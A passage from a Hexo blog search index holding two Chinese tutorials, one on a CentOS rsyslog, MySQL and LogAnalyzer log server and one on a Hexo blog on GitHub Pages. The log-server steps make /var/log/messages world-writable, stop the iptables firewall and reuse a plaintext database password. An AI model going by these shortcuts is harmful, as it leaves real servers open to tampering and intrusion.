class="language-bash"><span class="token comment" spellcheck="true"># service httpd start</span><span class="token comment" spellcheck="true"># service mysqld start</span><span class="token comment" spellcheck="true"># service rsyslog start</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="9"><li>安装Rsyslog支持数据库支持</li></ol><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> rsyslog-mysql -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="10"><li>测试是不是支持php</li></ol><pre class="line-numbers language-bash"><code class="language-bash">vim /var/www/html/index.php <span class="token operator">&lt;</span>?phpphpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="11"><li>在网页上输入服务器 IP 地址，测试 lamp 是否配置成功<br><img src="https://i.loli.net/2019/08/06/NM9VZP8LFJdcRBY.png" alt="rsylog-1.png"></li></ol><ol start="12"><li>查看是否有数据库文件 createDB.sql</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># ll /usr/share/doc/rsyslog-mysql-5.8.10/createDB.sql</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="13"><li>导入 createDB.sql 文件到数据库中</li></ol><pre class="line-numbers language-bash"><code class="language-bash">mysql -u root -p <span class="token operator">&lt;</span> /usr/share/doc/rsyslog-mysql-5.8.10/createDB.sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="14"><li>进入数据库，查看是否有 Syslog 数据库</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># mysql -uroot -p</span>mysql<span class="token operator">&gt;</span> show databases<span class="token punctuation">;</span>+--------------------+<span class="token operator">|</span> Database           <span class="token operator">|</span>+--------------------+<span class="token operator">|</span> information_schema <span class="token operator">|</span><span class="token operator">|</span> Syslog             <span class="token operator">|</span><span class="token operator">|</span> mysql              <span class="token operator">|</span><span class="token operator">|</span> <span class="token function">test</span>               <span class="token operator">|</span>+--------------------+4 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="15"><li>Mysql数据库建立一个用户，并制授权用户给上面导入时建立的库Syslog所有权限</li></ol><pre class="line-numbers language-bash"><code class="language-bash">mysql<span class="token operator">&gt;</span> grant all privileges on Syslog.* to <span class="token string">'rsyslog'</span>@<span class="token string">'localhost'</span> identified by <span class="token string">'syslogps'</span><span class="token punctuation">;</span> mysql<span class="token operator">&gt;</span> grant all privileges on Syslog.* to <span class="token string">'rsyslog'</span>@<span class="token string">'127.0.0.1'</span> identified by <span class="token string">'syslogps'</span><span class="token punctuation">;</span>mysql<span class="token operator">&gt;</span> flush privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="16"><li>修改 rsyslog 配置文件</li></ol><pre class="line-numbers language-bash"><code class="language-bash">//** 删除前面的 “\#” **//<span class="token variable">$ModLoad</span> imtcp<span class="token variable">$InputTCPServerRun</span> 514//** 添加如下两行 **//<span class="token variable">$ModLoad</span> ommysql*.* :ommysql:127.0.0.1,Syslog,rsyslog,syslogps  //** 这里的 *.* 表示任意用户名，127.0.0.1 数据库的 ip地址（根据自己的环境做调整） Syslog 是数据库，rsyslog 是数据库授权的用户名，syslogps 是密码。 **//<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="17"><li>重启服务</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> rsyslog restart <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="18"><li>安装loganalyzer软件</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># wget http://download.adiscon.com/loganalyzer/loganalyzer-3.6.3.tar.gz</span><span class="token comment" spellcheck="true"># tar xf loganalyzer-3.6.3.tar.gz</span>//** 这里会提示“是否覆盖文件 index.php” ，输入 y，回车。 **//<span class="token comment" spellcheck="true"># cp -r loganalyzer-3.6.3/src/* /var/www/html/   </span><span class="token comment" spellcheck="true"># cp -r loganalyzer-3.6.3/contrib/* /var/www/html/</span><span class="token comment" spellcheck="true"># cd /var/www/html/</span><span class="token comment" spellcheck="true"># chmod 700 *.sh</span><span class="token comment" spellcheck="true"># ./configure.sh</span><span class="token comment" spellcheck="true"># chmod 777 /var/log/messages</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="19"><li>客户端配置</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># echo "*.* @@192.168.0.101:514" &gt;&gt; /etc/rsyslog.conf</span><span class="token comment" spellcheck="true"># service rsyslog restart</span><span class="token comment" spellcheck="true"># service iptables stop</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="网页安装-loganalyzer"><a href="#网页安装-loganalyzer" class="headerlink" title="网页安装 loganalyzer"></a>网页安装 loganalyzer</h2><ol><li>点击 Next</li></ol><p><img src="https://i.loli.net/2019/08/06/ozSn83CImyVOTRG.png" alt="rsylog-2.png"></p><ol start="2"><li>点击 Next</li></ol><p><img src="https://i.loli.net/2019/08/06/swlXuC7PaB1N5Mr.png" alt="rsylog-3.png"></p><ol start="3"><li>Enable User Database 项选择（yes）。Database Host（127.0.0.1，或localhost）；Database Name（Syslog）；Database User（rsyslog）；Database Password（syslogps）</li></ol><p><img src="https://i.loli.net/2019/08/06/teVPvrXEmd7DqYl.png" alt="rsylog-4.png"></p><ol start="4"><li>点击 Next</li></ol><p><img src="https://i.loli.net/2019/08/06/L9yDOIFqkRpJwNE.png" alt="rsylog-5.png"></p><ol start="5"><li>点击 Next</li></ol><p><img src="https://i.loli.net/2019/08/06/FL1eDsuQZWU9Tlw.png" alt="rsylog-6.png"></p><ol start="6"><li>创建账户，点击 Next</li></ol><p><img src="https://i.loli.net/2019/08/06/6W3qJ9jTbSPpRxN.png" alt="rsylog-7.png"></p><ol start="7"><li>注意大小写，用户名密码同上</li></ol><p><img src="https://i.loli.net/2019/08/06/6bYUcfjrq3aRIgF.png" alt="rsylog-8.png"></p><ol start="8"><li>点击 Finish</li></ol><p><img src="https://i.loli.net/2019/08/06/jhuLeCWd6qmo3J7.png" alt="rsylog-9.png"></p><ol start="9"><li>输入刚才创建的账户的用户名和密码</li></ol><p><img src="https://i.loli.net/2019/08/06/DvyNPQKsR7JGnHe.png" alt="rsylog-10.png"></p><ol start="10"><li>登录界面</li></ol><p><img src="https://i.loli.net/2019/08/06/O3yhQYuqe6p9wPR.png" alt="rsylog-11.png"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="http://blog.51cto.com/2475296/1783864" target="_blank" rel="noopener">Centos6.5安装rsyslog+loganalyzer+mysql部署日志服务器</a></p><p><a href="https://blog.csdn.net/qq_24038207/article/details/68065553" target="_blank" rel="noopener">centos6.5经典搭建lamp(详细教程)</a></p><p><a href="https://www.jianshu.com/p/f4bcb808824d" target="_blank" rel="noopener">loganalyzer装完报错no syslog records found</a></p><p><a href="https://tecadmin.net/setup-loganalyzer-with-rsyslog-and-mysql/" target="_blank" rel="noopener">How to Setup LogAnalyzer with Rsyslog and MySQL</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建个人博客</title>
      <link href="/2019/08/06/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/08/06/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li><a href="https://dcc.godaddy.com" target="_blank" rel="noopener">购买域名</a></li><li><a href="https://github.com">创建 github 帐号</a></li><li><a href="https://git-scm.com/" target="_blank" rel="noopener">安装 git</a></li><li><a href="http://nodejs.org/download/" target="_blank" rel="noopener">安装 node</a></li></ol><h2 id="检测环境"><a href="#检测环境" class="headerlink" title="检测环境"></a>检测环境</h2><ol><li><p>在任意磁盘新建 My_Blog 文件夹（不建议放在 c 盘）</p></li><li><p>在 My_Blog 下，打开 git bash</p></li></ol><p><img src="https://i.loli.net/2019/08/06/ealKG91FMt8kVQO.jpg" alt="hexo-1.jpg"></p><ol start="3"><li>检测 npm 环境配置</li></ol><pre class="line-numbers language-bash"><code class="language-bash"> $ <span class="token function">npm</span> -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/08/06/fEw4A8rSnqJBHTm.png" alt="npm-1.png"></p><h2 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h2><ol><li>安装 hexo</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span> -g hexo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/08/06/BFCZcuL7lKdPGY6.png" alt="hexo-2.png"></p><ol start="2"><li>初始化 hexo</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ hexo init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/08/06/QaBZCsWF1qIXhj9.png" alt="hexo-3.png"></p><ol start="3"><li>安装项目依赖的模块<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><img src="https://i.loli.net/2019/08/06/e6ZIMEx419uv5Ot.png" alt="hexo-4.png"></p><ol start="4"><li>开启 hexo服务<pre class="line-numbers language-bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><img src="https://i.loli.net/2019/08/06/weuBq1LOzskljh7.png" alt="hexo-5.png"></p><ol start="5"><li><p>清空静态界面(重新开一个git bash)</p><pre class="line-numbers language-bash"><code class="language-bash">$ hexo clean<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/08/06/AqO9eblF2jEvdRH.png" alt="hexo-6.png"></p></li><li><p>生成静态界面</p><pre class="line-numbers language-bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/08/06/MmD8ckTnKGHwqUE.png" alt="hexo-7.png"></p></li><li><p>重新部署</p><pre class="line-numbers language-bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/08/06/5XV9RgEH2p8btm6.png" alt="hexo-8.png"></p></li><li><p><a href="http://localhost:4000" target="_blank" rel="noopener">测试网址</a></p></li></ol><p><img src="https://i.loli.net/2019/08/06/vSthBLGXYp96ki3.png" alt="hexo-9.png"></p><h2 id="创建、配置-github-项目"><a href="#创建、配置-github-项目" class="headerlink" title="创建、配置 github 项目"></a>创建、配置 github 项目</h2><ol><li>新建仓库</li></ol><p><img src="https://i.loli.net/2019/08/06/8ynTV25hkmvOlpC.png" alt="github-1.png"></p><ol start="2"><li>配置 仓库名、仓库描述、readme 文件</li></ol><p><img src="https://i.loli.net/2019/08/06/b4gS5B8xR9TCuLj.png" alt="github-2.png"></p><ol start="9"><li>修改 _config.yml 文件</li></ol><p><img src="https://i.loli.net/2019/08/06/O6TrKH28dzQkMhU.png" alt="hexo-10.png"></p><ol start="4"><li>测试本地的 hexo 与 github 是否关联成功：<pre class="line-numbers language-bash"><code class="language-bash">$ hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://i.loli.net/2019/08/06/X8sFTk9SRWUiNQl.png" alt="hexo-11.png"></li></ol><p><img src="https://i.loli.net/2019/08/06/adOlg3nxBhQKsZG.png" alt="hexo-14.png"></p><ol start="5"><li>测试网址：<a href="https://hhkk2334.github.io（项目名称）" target="_blank" rel="noopener">https://hhkk2334.github.io（项目名称）</a></li></ol><p><img src="https://i.loli.net/2019/08/06/8Lpm5WoqiYPRrXK.png" alt="hexo-13.png"></p><ol start="3"><li>创建文件</li></ol><p><img src="https://i.loli.net/2019/08/06/kfzSd8KZAV6PWGv.png" alt="github-3.png"></p><ol start="6"><li>文件名为 CNAME，内容为购买的 DNS 地址</li></ol><p><img src="https://i.loli.net/2019/08/06/7odqmE9L4ZnRIaz.png" alt="github-4.png"></p><ol start="7"><li>配置项目</li></ol><p><img src="https://i.loli.net/2019/08/06/fMVNu6ldHwBasX8.png" alt="github-5.png"></p><ol start="8"><li>配置 DNS ，开启 https</li></ol><p><img src="https://i.loli.net/2019/08/06/8bSCvhOmRMwYFde.png" alt="github-6.png"></p><h2 id="配置域名"><a href="#配置域名" class="headerlink" title="配置域名"></a>配置域名</h2><ol><li>管理 DNS</li></ol><p><img src="https://i.loli.net/2019/08/06/jnyNAemYIgBqDLU.png" alt="dns-1.png"></p><ol start="2"><li>ping 项目名称，解析 github 服务器 ip 地址</li></ol><p><img src="https://i.loli.net/2019/08/06/C6x5phaSqGOldn9.png" alt="dns-2.png"></p><ol start="3"><li>修改 dns 正向 和 反向解析</li></ol><p><img src="https://i.loli.net/2019/08/06/4ingqAMBvmy63uR.png" alt="dns-3.png"></p><ol start="4"><li>设置如下：对应 github 服务器 IP 地址和 github 项目名称</li></ol><p><img src="https://i.loli.net/2019/08/06/o3AhHIJLR2VfYby.png" alt="dns-4.png"></p><ol start="9"><li>输入 dns，测试网址是否搭建成功</li></ol><p><img src="https://i.loli.net/2019/08/06/uMrTSbWFKNOJBey.png" alt="github-7.png"></p><h2 id="更换-hexo-主题"><a href="#更换-hexo-主题" class="headerlink" title="更换 hexo 主题"></a>更换 hexo 主题</h2><p>这里以 next 主题为例，可在<a href="https://hexo.io/themes/" target="_blank" rel="noopener">hexo-thems</a> 下载自己喜欢的主题。</p><ol><li>克隆主题</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> clone https://github.com/theme-next/hexo-theme-next themes/next<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/08/06/ghrsk5MRVK91oib.png" alt="hexocg-1.png"></p><ol start="2"><li>查看 themes 文件夹</li></ol><p><img src="https://i.loli.net/2019/08/06/OElJiRbWvuaoDxs.png" alt="hexocg-2.png"></p><ol start="3"><li>修改 _config.yml 文件</li></ol><p><img src="https://i.loli.net/2019/08/06/nfaqAvwSeprBNik.png" alt="hexocg-4.png"></p><ol start="4"><li>将 themes 修改为，你想应用的主题</li></ol><p><img src="https://i.loli.net/2019/08/06/ODul7kpKMBILc4i.png" alt="hexocg-3.png"></p><ol start="5"><li>清空静态页面</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ hexo clean<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>生成静态页面</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>重新部署 </li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://blog.csdn.net/ainuser/article/details/77609180" target="_blank" rel="noopener">hexo+github搭建个人博客(超详细教程)</a></p><p><a href="https://www.jianshu.com/p/5c6c6cf325cd" target="_blank" rel="noopener">hexo ERROR Deployer not found: github</a></p><p><a href="https://github.com/theme-next/hexo-theme-next/blob/master/docs/INSTALLATION.md">theme-next</a></p><p><a href="https://blog.csdn.net/y_z_w123/article/details/78801096" target="_blank" rel="noopener">hexo的安装和主题的替换</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
